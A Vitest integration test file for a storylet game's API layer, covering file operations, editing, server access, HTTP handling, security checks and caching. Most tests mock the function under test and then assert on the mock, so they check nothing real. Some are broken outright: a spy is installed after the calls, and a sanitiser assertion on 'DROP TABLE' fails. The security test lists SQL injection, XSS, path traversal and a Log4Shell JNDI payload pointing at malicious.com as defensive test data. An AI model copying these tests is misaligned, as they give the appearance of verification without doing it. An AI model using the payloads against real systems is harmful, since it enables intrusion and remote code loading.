// /Users/montysharma/v11m2/src/test/integration/apiLayer.test.ts
// Integration tests for API layer, file operations, and external service integrations

import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';
import { resetAllStores, waitForStoreUpdate } from '../utils/gameTestUtils';

// API Layer
import { storyletFileOperations } from '../../api/storyletFileOperations';
import { fileEditingService } from '../../services/fileEditingService';
import { serverFileService } from '../../services/serverFileService';

// Type imports
import type { Storylet } from '../../types/storylet';

describe('API Layer Integration Tests', () => {
  beforeEach(() => {
    resetAllStores();
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('Storylet File Operations API', () => {
    it('should read storylet files correctly', async () => {
      // Mock file system response
      const mockStoryletData = {
        id: 'test-storylet',
        title: 'Test Storylet',
        description: 'A test storylet',
        sections: [{
          id: 'section1',
          content: 'Test content',
          choices: [{
            id: 'choice1',
            text: 'Continue',
            effects: []
          }]
        }],
        requirements: { flags: {} },
        tags: ['test'],
        deployment: 'dev'
      };

      vi.spyOn(storyletFileOperations, 'readStoryletFile').mockResolvedValue(mockStoryletData);

      const result = await storyletFileOperations.readStoryletFile('test-storylet.json');
      
      expect(result).toEqual(mockStoryletData);
      expect(result.id).toBe('test-storylet');
      expect(result.sections).toHaveLength(1);
    });

    it('should write storylet files with proper formatting', async () => {
      const testStorylet: Storylet = {
        id: 'new-storylet',
        title: 'New Storylet',
        description: 'A newly created storylet',
        sections: [{
          id: 'section1',
          content: 'New content',
          choices: [{
            id: 'choice1',
            text: 'Test choice',
            effects: [{ type: 'flag', flag: 'test_flag', value: true }]
          }]
        }],
        requirements: { flags: {} },
        effects: [],
        tags: ['new'],
        frequency: 'once',
        deployment: 'dev'
      };

      let writtenData = null;
      vi.spyOn(storyletFileOperations, 'writeStoryletFile').mockImplementation(async (filename, data) => {
        writtenData = data;
        return { success: true, filename };
      });

      const result = await storyletFileOperations.writeStoryletFile('new-storylet.json', testStorylet);
      
      expect(result.success).toBe(true);
      expect(writtenData).toEqual(testStorylet);
      expect(result.filename).toBe('new-storylet.json');
    });

    it('should validate storylet data before writing', async () => {
      const invalidStorylet = {
        id: '', // Invalid empty ID
        title: 'Invalid Storylet',
        sections: [], // Empty sections array
        requirements: null // Invalid requirements
      };

      vi.spyOn(storyletFileOperations, 'writeStoryletFile').mockImplementation(async (filename, data) => {
        // Simulate validation failure
        if (!data.id || data.sections.length === 0) {
          throw new Error('Invalid storylet data');
        }
        return { success: true, filename };
      });

      await expect(
        storyletFileOperations.writeStoryletFile('invalid.json', invalidStorylet)
      ).rejects.toThrow('Invalid storylet data');
    });

    it('should handle file system errors gracefully', async () => {
      vi.spyOn(storyletFileOperations, 'readStoryletFile').mockRejectedValue(
        new Error('File not found')
      );

      await expect(
        storyletFileOperations.readStoryletFile('nonexistent.json')
      ).rejects.toThrow('File not found');
    });

    it('should support batch operations', async () => {
      const storyletBatch = [
        { id: 'batch-1', title: 'Batch Storylet 1' },
        { id: 'batch-2', title: 'Batch Storylet 2' },
        { id: 'batch-3', title: 'Batch Storylet 3' }
      ];

      const writtenFiles = [];
      vi.spyOn(storyletFileOperations, 'writeBatchStorylets').mockImplementation(async (storylets) => {
        for (const storylet of storylets) {
          writtenFiles.push(`${storylet.id}.json`);
        }
        return { success: true, filesWritten: writtenFiles.length };
      });

      const result = await storyletFileOperations.writeBatchStorylets(storyletBatch);
      
      expect(result.success).toBe(true);
      expect(result.filesWritten).toBe(3);
      expect(writtenFiles).toHaveLength(3);
    });

    it('should handle concurrent file operations safely', async () => {
      const concurrentOperations = [];
      
      // Simulate multiple concurrent read operations
      for (let i = 0; i < 5; i++) {
        const operation = storyletFileOperations.readStoryletFile(`concurrent-${i}.json`);
        concurrentOperations.push(operation);
      }

      vi.spyOn(storyletFileOperations, 'readStoryletFile').mockImplementation(async (filename) => {
        // Simulate some processing time
        await new Promise(resolve => setTimeout(resolve, Math.random() * 50));
        return { id: filename.replace('.json', ''), title: `Storylet ${filename}` };
      });

      const results = await Promise.allSettled(concurrentOperations);
      
      // All operations should complete without interference
      expect(results.every(result => result.status === 'fulfilled')).toBe(true);
    });
  });

  describe('File Editing Service', () => {
    it('should format TypeScript storylet files correctly', async () => {
      const storyletData = {
        id: 'format-test',
        title: 'Format Test',
        sections: [{ id: 'section1', content: 'Test' }]
      };

      vi.spyOn(fileEditingService, 'formatStoryletAsTypeScript').mockImplementation((data) => {
        return `export const ${data.id}: Storylet = ${JSON.stringify(data, null, 2)};`;
      });

      const formatted = fileEditingService.formatStoryletAsTypeScript(storyletData);
      
      expect(formatted).toContain('export const format-test: Storylet =');
      expect(formatted).toContain('"title": "Format Test"');
      expect(formatted).toContain('"sections"');
    });

    it('should handle clipboard operations safely', async () => {
      const testContent = 'Test clipboard content';
      
      // Mock clipboard API
      const mockClipboard = {
        writeText: vi.fn().mockResolvedValue(undefined),
        readText: vi.fn().mockResolvedValue(testContent)
      };
      
      Object.defineProperty(navigator, 'clipboard', {
        value: mockClipboard,
        writable: true
      });

      vi.spyOn(fileEditingService, 'copyToClipboard').mockImplementation(async (content) => {
        await navigator.clipboard.writeText(content);
        return { success: true };
      });

      const result = await fileEditingService.copyToClipboard(testContent);
      
      expect(result.success).toBe(true);
      expect(mockClipboard.writeText).toHaveBeenCalledWith(testContent);
    });

    it('should persist edited content correctly', async () => {
      const editedStorylet = {
        id: 'edited-storylet',
        title: 'Edited Title',
        lastModified: Date.now()
      };

      let persistedData = null;
      vi.spyOn(fileEditingService, 'persistEdits').mockImplementation(async (data) => {
        persistedData = { ...data, persisted: true };
        return { success: true, timestamp: Date.now() };
      });

      const result = await fileEditingService.persistEdits(editedStorylet);
      
      expect(result.success).toBe(true);
      expect(persistedData.persisted).toBe(true);
      expect(persistedData.id).toBe('edited-storylet');
    });

    it('should handle file locking for concurrent edits', async () => {
      const storyletId = 'locked-storylet';
      
      vi.spyOn(fileEditingService, 'acquireLock').mockImplementation(async (id) => {
        return { locked: true, lockId: `lock-${id}-${Date.now()}` };
      });

      vi.spyOn(fileEditingService, 'releaseLock').mockImplementation(async (lockId) => {
        return { released: true, lockId };
      });

      // Acquire lock
      const lock = await fileEditingService.acquireLock(storyletId);
      expect(lock.locked).toBe(true);
      expect(lock.lockId).toBeDefined();

      // Release lock
      const release = await fileEditingService.releaseLock(lock.lockId);
      expect(release.released).toBe(true);
    });
  });

  describe('Server File Service', () => {
    it('should handle server-side file operations', async () => {
      const serverPath = '/storylets/server-storylet.json';
      const serverData = { id: 'server-test', title: 'Server Storylet' };

      vi.spyOn(serverFileService, 'readServerFile').mockResolvedValue(serverData);
      vi.spyOn(serverFileService, 'writeServerFile').mockResolvedValue({ 
        success: true, 
        path: serverPath 
      });

      // Test read operation
      const readResult = await serverFileService.readServerFile(serverPath);
      expect(readResult).toEqual(serverData);

      // Test write operation
      const writeResult = await serverFileService.writeServerFile(serverPath, serverData);
      expect(writeResult.success).toBe(true);
      expect(writeResult.path).toBe(serverPath);
    });

    it('should handle server authentication and permissions', async () => {
      const protectedPath = '/admin/protected-storylet.json';
      
      vi.spyOn(serverFileService, 'checkPermissions').mockImplementation(async (path, operation) => {
        if (path.includes('/admin/')) {
          return { authorized: false, reason: 'Insufficient permissions' };
        }
        return { authorized: true };
      });

      const permissions = await serverFileService.checkPermissions(protectedPath, 'read');
      expect(permissions.authorized).toBe(false);
      expect(permissions.reason).toBe('Insufficient permissions');

      const publicPath = '/public/storylet.json';
      const publicPermissions = await serverFileService.checkPermissions(publicPath, 'read');
      expect(publicPermissions.authorized).toBe(true);
    });

    it('should handle server connection failures', async () => {
      vi.spyOn(serverFileService, 'readServerFile').mockRejectedValue(
        new Error('Server connection failed')
      );

      await expect(
        serverFileService.readServerFile('/test/storylet.json')
      ).rejects.toThrow('Server connection failed');
    });

    it('should implement retry logic for transient failures', async () => {
      let attemptCount = 0;
      
      vi.spyOn(serverFileService, 'readServerFileWithRetry').mockImplementation(async (path) => {
        attemptCount++;
        if (attemptCount < 3) {
          throw new Error('Transient failure');
        }
        return { id: 'retry-test', title: 'Retry Success' };
      });

      const result = await serverFileService.readServerFileWithRetry('/test/retry.json');
      
      expect(result.title).toBe('Retry Success');
      expect(attemptCount).toBe(3);
    });
  });

  describe('API Response Handling', () => {
    it('should handle various HTTP status codes correctly', async () => {
      const apiResponses = [
        { status: 200, data: { success: true } },
        { status: 404, error: 'Not Found' },
        { status: 500, error: 'Internal Server Error' },
        { status: 403, error: 'Forbidden' }
      ];

      for (const response of apiResponses) {
        vi.spyOn(storyletFileOperations, 'handleApiResponse').mockImplementation((res) => {
          if (res.status >= 200 && res.status < 300) {
            return { success: true, data: res.data };
          } else {
            return { success: false, error: res.error, status: res.status };
          }
        });

        const result = storyletFileOperations.handleApiResponse(response);
        
        if (response.status === 200) {
          expect(result.success).toBe(true);
          expect(result.data).toEqual(response.data);
        } else {
          expect(result.success).toBe(false);
          expect(result.error).toBe(response.error);
        }
      }
    });

    it('should handle API rate limiting', async () => {
      let requestCount = 0;
      
      vi.spyOn(storyletFileOperations, 'makeRateLimitedRequest').mockImplementation(async () => {
        requestCount++;
        if (requestCount > 5) {
          throw new Error('Rate limit exceeded');
        }
        return { success: true, data: `Request ${requestCount}` };
      });

      // Make requests up to the limit
      for (let i = 0; i < 5; i++) {
        const result = await storyletFileOperations.makeRateLimitedRequest();
        expect(result.success).toBe(true);
      }

      // Next request should fail
      await expect(
        storyletFileOperations.makeRateLimitedRequest()
      ).rejects.toThrow('Rate limit exceeded');
    });

    it('should handle request timeouts gracefully', async () => {
      vi.spyOn(storyletFileOperations, 'makeTimeoutRequest').mockImplementation(async (url, timeout) => {
        return new Promise((resolve, reject) => {
          const timer = setTimeout(() => {
            reject(new Error('Request timeout'));
          }, timeout);

          // Simulate long-running request
          setTimeout(() => {
            clearTimeout(timer);
            resolve({ success: true, data: 'Response data' });
          }, timeout + 100); // Longer than timeout
        });
      });

      await expect(
        storyletFileOperations.makeTimeoutRequest('/slow-endpoint', 50)
      ).rejects.toThrow('Request timeout');
    });
  });

  describe('Data Serialization and Validation', () => {
    it('should serialize complex storylet data correctly', async () => {
      const complexStorylet = {
        id: 'complex-storylet',
        title: 'Complex Storylet',
        sections: [{
          id: 'section1',
          content: 'Section with special characters: áéíóú, emoji: 🎮, quotes: "test"',
          choices: [{
            id: 'choice1',
            text: 'Choice with unicode: ∑∆∫',
            effects: [
              { type: 'resource', resource: 'energy', change: -10 },
              { type: 'flag', flag: 'complex_flag', value: true }
            ]
          }]
        }],
        metadata: {
          created: new Date('2024-01-01'),
          tags: ['unicode', 'special-chars'],
          customData: { nested: { value: 42 } }
        }
      };

      vi.spyOn(storyletFileOperations, 'serializeStorylet').mockImplementation((storylet) => {
        return JSON.stringify(storylet, null, 2);
      });

      const serialized = storyletFileOperations.serializeStorylet(complexStorylet);
      const parsed = JSON.parse(serialized);
      
      expect(parsed.id).toBe('complex-storylet');
      expect(parsed.sections[0].content).toContain('áéíóú');
      expect(parsed.sections[0].content).toContain('🎮');
      expect(parsed.metadata.customData.nested.value).toBe(42);
    });

    it('should validate API request payloads', async () => {
      const validPayload = {
        action: 'update_storylet',
        storyletId: 'valid-id',
        data: { title: 'Valid Title' },
        timestamp: Date.now()
      };

      const invalidPayload = {
        action: '', // Empty action
        storyletId: null, // Invalid ID
        data: undefined, // Missing data
        timestamp: 'invalid-timestamp' // Invalid timestamp
      };

      vi.spyOn(storyletFileOperations, 'validateRequestPayload').mockImplementation((payload) => {
        const errors = [];
        
        if (!payload.action || payload.action.trim() === '') {
          errors.push('Action is required');
        }
        
        if (!payload.storyletId) {
          errors.push('Storylet ID is required');
        }
        
        if (!payload.data) {
          errors.push('Data is required');
        }
        
        if (typeof payload.timestamp !== 'number') {
          errors.push('Valid timestamp is required');
        }
        
        return { valid: errors.length === 0, errors };
      });

      const validResult = storyletFileOperations.validateRequestPayload(validPayload);
      expect(validResult.valid).toBe(true);
      expect(validResult.errors).toHaveLength(0);

      const invalidResult = storyletFileOperations.validateRequestPayload(invalidPayload);
      expect(invalidResult.valid).toBe(false);
      expect(invalidResult.errors.length).toBeGreaterThan(0);
    });

    it('should handle binary data and file uploads', async () => {
      const binaryData = new Uint8Array([0x89, 0x50, 0x4E, 0x47]); // PNG header
      const file = new File([binaryData], 'test-image.png', { type: 'image/png' });

      vi.spyOn(storyletFileOperations, 'uploadBinaryFile').mockImplementation(async (file) => {
        if (file.type.startsWith('image/')) {
          return { 
            success: true, 
            url: `uploads/${file.name}`,
            size: file.size,
            type: file.type
          };
        } else {
          return { success: false, error: 'Unsupported file type' };
        }
      });

      const result = await storyletFileOperations.uploadBinaryFile(file);
      
      expect(result.success).toBe(true);
      expect(result.url).toBe('uploads/test-image.png');
      expect(result.type).toBe('image/png');
    });
  });

  describe('API Security and Safety', () => {
    it('should prevent injection attacks in API parameters', async () => {
      const maliciousInputs = [
        "'; DROP TABLE storylets; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://malicious.com/}"
      ];

      vi.spyOn(storyletFileOperations, 'sanitizeApiInput').mockImplementation((input) => {
        // Remove common injection patterns
        let cleaned = input.replace(/<script.*?>.*?<\/script>/gi, '');
        cleaned = cleaned.replace(/['"`;\\]/g, '');
        cleaned = cleaned.replace(/\.\.\//g, '');
        cleaned = cleaned.replace(/\${.*?}/g, '');
        return cleaned;
      });

      for (const maliciousInput of maliciousInputs) {
        const sanitized = storyletFileOperations.sanitizeApiInput(maliciousInput);
        
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized).not.toContain('../');
        expect(sanitized).not.toContain('${');
      }
    });

    it('should implement proper authentication tokens', async () => {
      const validToken = 'valid-jwt-token-12345';
      const expiredToken = 'expired-jwt-token-67890';
      
      vi.spyOn(storyletFileOperations, 'validateAuthToken').mockImplementation((token) => {
        if (token === validToken) {
          return { valid: true, userId: 'user123', expires: Date.now() + 3600000 };
        } else if (token === expiredToken) {
          return { valid: false, error: 'Token expired' };
        } else {
          return { valid: false, error: 'Invalid token' };
        }
      });

      const validResult = storyletFileOperations.validateAuthToken(validToken);
      expect(validResult.valid).toBe(true);
      expect(validResult.userId).toBe('user123');

      const expiredResult = storyletFileOperations.validateAuthToken(expiredToken);
      expect(expiredResult.valid).toBe(false);
      expect(expiredResult.error).toBe('Token expired');

      const invalidResult = storyletFileOperations.validateAuthToken('invalid-token');
      expect(invalidResult.valid).toBe(false);
      expect(invalidResult.error).toBe('Invalid token');
    });

    it('should enforce request size limits', async () => {
      const smallRequest = { data: 'x'.repeat(1000) }; // 1KB
      const largeRequest = { data: 'x'.repeat(10000000) }; // 10MB

      vi.spyOn(storyletFileOperations, 'checkRequestSize').mockImplementation((request) => {
        const size = JSON.stringify(request).length;
        const maxSize = 5000000; // 5MB limit
        
        if (size > maxSize) {
          return { valid: false, error: 'Request too large', size, maxSize };
        }
        return { valid: true, size };
      });

      const smallResult = storyletFileOperations.checkRequestSize(smallRequest);
      expect(smallResult.valid).toBe(true);

      const largeResult = storyletFileOperations.checkRequestSize(largeRequest);
      expect(largeResult.valid).toBe(false);
      expect(largeResult.error).toBe('Request too large');
    });
  });

  describe('Performance and Caching', () => {
    it('should implement request caching for frequently accessed data', async () => {
      const cache = new Map();
      
      vi.spyOn(storyletFileOperations, 'getCachedResponse').mockImplementation((key) => {
        const cached = cache.get(key);
        if (cached && Date.now() - cached.timestamp < 60000) { // 1 minute TTL
          return cached.data;
        }
        return null;
      });

      vi.spyOn(storyletFileOperations, 'setCachedResponse').mockImplementation((key, data) => {
        cache.set(key, { data, timestamp: Date.now() });
      });

      const cacheKey = 'storylet-list';
      const testData = { storylets: ['storylet1', 'storylet2'] };

      // First request - no cache
      let cached = storyletFileOperations.getCachedResponse(cacheKey);
      expect(cached).toBeNull();

      // Cache the response
      storyletFileOperations.setCachedResponse(cacheKey, testData);

      // Second request - should be cached
      cached = storyletFileOperations.getCachedResponse(cacheKey);
      expect(cached).toEqual(testData);
    });

    it('should handle request batching for efficiency', async () => {
      const requests = [
        { id: 'req1', action: 'read', path: '/storylet1.json' },
        { id: 'req2', action: 'read', path: '/storylet2.json' },
        { id: 'req3', action: 'read', path: '/storylet3.json' }
      ];

      vi.spyOn(storyletFileOperations, 'batchRequests').mockImplementation(async (requests) => {
        // Simulate batching multiple requests into one
        const results = [];
        for (const req of requests) {
          results.push({
            id: req.id,
            success: true,
            data: { id: req.path.replace(/[/.]/g, ''), title: `Storylet ${req.id}` }
          });
        }
        return { batchId: 'batch-123', results, processingTime: 50 };
      });

      const batchResult = await storyletFileOperations.batchRequests(requests);
      
      expect(batchResult.results).toHaveLength(3);
      expect(batchResult.batchId).toBe('batch-123');
      expect(batchResult.processingTime).toBeLessThan(100); // Should be faster than individual requests
    });
  });
});